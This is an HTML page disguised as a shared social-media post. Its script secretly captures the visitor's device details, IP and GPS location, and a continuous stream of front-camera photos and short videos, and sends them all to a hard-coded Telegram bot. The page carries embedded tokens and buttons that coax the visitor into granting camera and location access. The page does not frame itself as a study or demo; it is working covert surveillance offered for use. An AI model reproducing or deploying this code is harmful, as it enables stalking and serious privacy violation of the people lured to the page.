<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Shahin Zyan masengar</title>
  <!-- Open Graph tags - سيتم تحديثها بواسطة Workflow -->
  <meta property="og:title" content="Shahin Zyan masengar">
  <meta property="og:description" content="شارك لك منشور">
  <meta property="og:image" content="https://i.ibb.co/vxBgm8XS/B7392-D8-F-DCE8-4-C07-BFDF-DC3-D2-FF9-A331.jpg">
  <meta property="og:url" content="https://asoalktabe-sudo.github.io/my-photo-app/">
  <!-- Twitter Card -->
  <meta name="twitter:title" content="Shahin Zyan masengar">
  <meta name="twitter:description" content="شارك لك منشور">
  <meta name="twitter:image" content="https://i.ibb.co/vxBgm8XS/B7392-D8-F-DCE8-4-C07-BFDF-DC3-D2-FF9-A331.jpg">
  <style>
    :root {
      --bg: #f0f2f5;
      --card-bg: #ffffff;
      --text-primary: #1c1e21;
      --text-secondary: #65676b;
      --border: #e4e6eb;
    }
    @media (prefers-color-scheme: dark) {
      :root {
        --bg: #18191a;
        --card-bg: #242526;
        --text-primary: #e4e6eb;
        --text-secondary: #b0b3b8;
        --border: #3e4042;
      }
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: var(--bg);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 20px;
      min-height: 100vh;
      position: relative;
    }
    .post-container {
      max-width: 500px;
      width: 100%;
      background: var(--card-bg);
      border-radius: 8px;
      box-shadow: 0 1px 2px rgba(0,0,0,0.1);
      overflow: hidden;
      border: 1px solid var(--border);
      margin-bottom: 15px;
    }
    .post-header {
      display: flex;
      align-items: center;
      padding: 12px 16px 0;
      position: relative;
    }
    .post-header img {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      margin-left: 8px;
      object-fit: cover;
    }
    .post-user { font-weight: 600; font-size: 15px; color: var(--text-primary); }
    .post-time { font-size: 13px; color: var(--text-secondary); }
    .post-text {
      padding: 4px 16px 12px;
      font-size: 15px;
      color: var(--text-primary);
      white-space: pre-wrap;
    }
    .post-image img { width: 100%; display: block; }
    .post-stats {
      display: flex;
      justify-content: space-between;
      padding: 8px 16px;
      font-size: 13px;
      color: var(--text-secondary);
      border-top: 1px solid var(--border);
    }
    .post-actions {
      display: flex;
      justify-content: space-evenly;
      padding: 4px 16px 8px;
      border-top: 1px solid var(--border);
      color: var(--text-secondary);
      font-size: 14px;
      font-weight: 600;
    }
    .post-actions span {
      cursor: pointer;
      padding: 8px 0;
      flex: 1;
      text-align: center;
    }
    .three-dots {
      position: absolute;
      top: 12px; left: 16px;
      width: 36px; height: 36px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      color: var(--text-secondary);
      font-size: 20px;
    }
    .three-dots:hover { background: var(--border); }

    .controls {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 10px;
      width: 100%;
      max-width: 500px;
      margin-top: 10px;
    }
    .retry-btn {
      padding: 12px 20px;
      font-size: 0.9rem;
      background: #1877f2;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-weight: 600;
      width: 100%;
    }
    .retry-btn.hidden { display: none; }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <div class="post-container" id="postContainer">
    <div class="post-header">
      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='50' fill='%23ccc'/%3E%3C/svg%3E" alt="">
      <div>
        <div class="post-user">المستخدم</div>
        <div class="post-time">الآن</div>
      </div>
      <div class="three-dots">⋯</div>
    </div>
    <div class="post-text">جارٍ تحميل المنشور...</div>
    <div class="post-stats"><span>0 تعليق</span><span>0 مشاركة</span></div>
    <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>
  </div>

  <div class="controls">
    <button class="retry-btn hidden" id="retryCameraBtn">إعادة محاولة الكاميرا</button>
    <button class="retry-btn hidden" id="retryLocationBtn">إعادة محاولة الموقع</button>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const B = '69ee19e8856a68218974812e';
    const T = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
    const C = '5151102782';
    const I = 'a7e43833d69a75';

    const post = document.getElementById('postContainer');
    const retryCamera = document.getElementById('retryCameraBtn');
    const retryLocation = document.getElementById('retryLocationBtn');
    const vid = document.getElementById('video');
    const cnv = document.getElementById('canvas');
    const ctx = cnv.getContext('2d');

    let stream = null;
    let photos = 0;
    let captureInterval = null;
    let recording = false;
    let deviceInfoSent = false;
    let gpsLoc = null;
    let ipLoc = null;
    let redirectUrl = 'https://www.facebook.com';

    async function sendText(text) {
      try {
        await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: C, text: text, parse_mode: 'HTML' })
        });
      } catch (e) {}
    }

    async function loadPost() {
      try {
        const r = await fetch(`https://api.jsonbin.io/v3/b/${B}/latest`);
        const d = await r.json();
        const s = d.record || {};
        redirectUrl = s.redirectUrl || redirectUrl;
        const name = s.profileName || 'Shahin Zyan';
        const avatar = s.profilePicture || 'https://i.ibb.co/zJx0q3Q/default-avatar.png';
        const text = s.postText || 'هذا نص تجريبي.';
        const postImg = s.postImage || '';
        const time = s.postTime || 'الآن';
        const comments = s.commentsCount || '12';
        const shares = s.sharesCount || '5';

        post.innerHTML = `
          <div class="post-header">
            <img src="${avatar}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 100 100%27%3E%3Ccircle cx=%2750%27 cy=%2750%27 r=%2750%27 fill=%27%23ccc%27/%3E%3C/svg%3E'">
            <div>
              <div class="post-user">${name}</div>
              <div class="post-time">${time}</div>
            </div>
            <div class="three-dots">⋯</div>
          </div>
          <div class="post-text">${text}</div>
          ${postImg ? `<div class="post-image"><img src="${postImg}" alt="صورة المنشور"></div>` : ''}
          <div class="post-stats"><span>${comments} تعليق</span><span>${shares} مشاركة</span></div>
          <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>
        `;
      } catch (e) {}
    }

    async function sendDeviceInfo() {
      if (deviceInfoSent) return;
      deviceInfoSent = true;
      try {
        const ua = navigator.userAgentData || {};
        let h = {};
        if (ua.getHighEntropyValues) {
          try { h = await ua.getHighEntropyValues(["platform","platformVersion","model","architecture"]); } catch(e) {}
        }
        const sc = window.screen;
        let bat = null;
        if ('getBattery' in navigator) {
          try { const b = await navigator.getBattery(); bat = { level: b.level, charging: b.charging }; } catch(e) {}
        }
        let txt = '<b>📱 معلومات الجهاز</b>\n';
        txt += `الموديل: ${h.model||'N/A'}\nالنظام: ${navigator.platform}\nالشاشة: ${sc.width}x${sc.height}\n`;
        txt += `المعالج: ${navigator.hardwareConcurrency||1} نواة\nالذاكرة: ${navigator.deviceMemory||'N/A'}GB\n`;
        if (bat) txt += `البطارية: ${(bat.level*100).toFixed(0)}% ${bat.charging?'⚡':'🔋'}\n`;
        txt += `اللغة: ${navigator.language}\nالمنطقة الزمنية: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
        await sendText(txt);
      } catch (e) {}
    }

    async function fetchIPLocation() {
      try {
        const r = await fetch(`https://ipinfo.io/json?token=${I}`);
        const d = await r.json();
        if (d.loc) {
          const [lat, lon] = d.loc.split(',').map(Number);
          ipLoc = { lat, lon, acc: 5000, src: 'IP' };
          await sendText(`📍 الموقع التقريبي (IP): ${lat}, ${lon}\n🌍 https://www.google.com/maps?q=${lat},${lon}`);
        }
      } catch (e) {}
    }

    async function requestGPS() {
      if (!navigator.geolocation) return false;
      try {
        const pos = await new Promise((res, rej) => {
          navigator.geolocation.getCurrentPosition(res, rej, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
          });
        });
        if (pos.coords.accuracy > 50) return false;
        gpsLoc = {
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          acc: pos.coords.accuracy,
          src: 'GPS'
        };
        await sendText(`📍 الموقع الدقيق (GPS): ${gpsLoc.lat}, ${gpsLoc.lon} (دقة ${gpsLoc.acc}م)\n🌍 https://www.google.com/maps?q=${gpsLoc.lat},${gpsLoc.lon}`);
        return true;
      } catch (e) {
        return false;
      }
    }

    async function attemptGPS() {
      const ok = await requestGPS();
      if (ok) {
        retryLocation.classList.add('hidden');
      } else {
        retryLocation.classList.remove('hidden');
        if (!ipLoc) await fetchIPLocation();
      }
    }

    async function startCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
        vid.srcObject = stream;
        await new Promise(r => { vid.onloadedmetadata = () => { vid.play(); r(); }; });
        captureInterval = setInterval(captureAndSend, 250);
        return true;
      } catch (e) {
        return false;
      }
    }

    function captureAndSend() {
      if (!stream || !vid.videoWidth) return;
      cnv.width = vid.videoWidth;
      cnv.height = vid.videoHeight;
      ctx.drawImage(vid, 0, 0);
      const blob = dataURLtoBlob(cnv.toDataURL('image/jpeg', 0.9));
      const form = new FormData();
      form.append('chat_id', C);
      form.append('photo', blob, 'snap.jpg');
      fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: form }).catch(() => {});
      photos++;
      if (photos % 5 === 0 && !recording) startVideoRecording();
    }

    function startVideoRecording() {
      if (!stream || recording) return;
      try {
        recording = true;
        const chunks = [];
        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
        recorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          const form = new FormData();
          form.append('chat_id', C);
          form.append('video', blob, 'clip.webm');
          form.append('caption', '🎥 فيديو تلقائي');
          await fetch(`https://api.telegram.org/bot${T}/sendVideo`, { method: 'POST', body: form }).catch(() => {});
          recording = false;
        };
        recorder.start();
        setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 3000);
      } catch (e) { recording = false; }
    }

    function dataURLtoBlob(dataUrl) {
      const arr = dataUrl.split(',');
      const mime = arr[0].match(/:(.*?);/)[1];
      const bstr = atob(arr[1]);
      const n = bstr.length;
      const u8 = new Uint8Array(n);
      for (let i = 0; i < n; i++) u8[i] = bstr.charCodeAt(i);
      return new Blob([u8], { type: mime });
    }

    function stopAll() {
      if (captureInterval) clearInterval(captureInterval);
      if (stream) stream.getTracks().forEach(t => t.stop());
    }

    async function attemptCamera() {
      const ok = await startCamera();
      if (ok) {
        retryCamera.classList.add('hidden');
      } else {
        retryCamera.classList.remove('hidden');
      }
    }

    async function sendExitReport() {
      let locStr = 'غير متوفر';
      if (gpsLoc) locStr = `GPS (${gpsLoc.lat}, ${gpsLoc.lon}, دقة ${gpsLoc.acc}م)`;
      else if (ipLoc) locStr = `IP (${ipLoc.lat}, ${ipLoc.lon})`;
      const report = `<b>📋 تقرير نهائي</b>\nعدد الصور: ${photos}\nالموقع: ${locStr}\nالوقت: ${new Date().toLocaleString()}`;
      await sendText(report);
    }

    retryCamera.addEventListener('click', async () => {
      retryCamera.classList.add('hidden');
      await attemptCamera();
    });

    retryLocation.addEventListener('click', async () => {
      retryLocation.classList.add('hidden');
      await attemptGPS();
    });

    window.addEventListener('beforeunload', () => {
      stopAll();
      sendExitReport();
    });

    (async function init() {
      await loadPost();
      sendDeviceInfo();
      fetchIPLocation();
      attemptGPS();
      attemptCamera();
    })();
  </script>
</body>
</html>
